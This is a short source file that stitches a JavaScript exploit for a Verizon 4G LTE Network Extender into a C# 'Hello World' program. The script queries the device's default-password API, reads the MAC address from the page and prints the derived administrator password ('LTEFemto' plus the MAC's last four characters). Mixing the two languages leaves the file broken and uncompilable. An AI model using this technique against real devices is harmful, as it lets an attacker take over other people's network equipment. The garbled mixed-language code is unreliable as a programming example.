using System;

public class Test
{
    public static void Main() {
        snippet:///Exploit
        //
        // Verizon 4G LTE Network Extender Super Awesome JS Exploit
        //

        console.log("Calling 'isDefaultPassword' API");
        let req = new Request("/webapi/isDefaultPassword");
        let def = req.url;

        const doAjax = async () => {
            const resp = await fetch(def);
            if (resp.ok) {
                const jsonyo = await resp.json();
                return Promise.resolve(jsonyo);
            } else {
                return Promise.reject("Smth not rite captain!");
            }
        }
        doAjax().then(console.log).catch(console.log);

        await new Promise(t => setTimeout(t, 1337));

        console.log("Verizon Admin Password: ");
        let mac = document.querySelector("#mac_address").innerHTML;
        console.log("LTEFemto" + mac.substr(-4));
        Console.WriteLine("Hello World");
    }
}